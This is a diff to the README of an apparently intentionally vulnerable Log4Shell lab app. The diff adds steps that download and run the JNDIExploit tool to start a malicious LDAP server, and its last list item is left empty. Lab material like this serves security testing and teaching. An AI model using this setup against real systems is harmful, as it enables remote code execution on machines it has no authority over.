@@ -26,6 +26,14 @@ Build the Docker image by yourself:
 
 <i>Note: This project is inspired by the <a href="https://github.com/christophetd/log4shell-vulnerable-app">christophetd</a> project.</i>
 
+- Use <a href="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit</a> to spin up a malicious LDAP server
+
+`wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888`
+
+- 
+
 # Commercial Support
 ![Tekium](https://github.com/unmanarc/uAuditAnalyzer2/blob/master/art/tekium_slogo.jpeg)
 
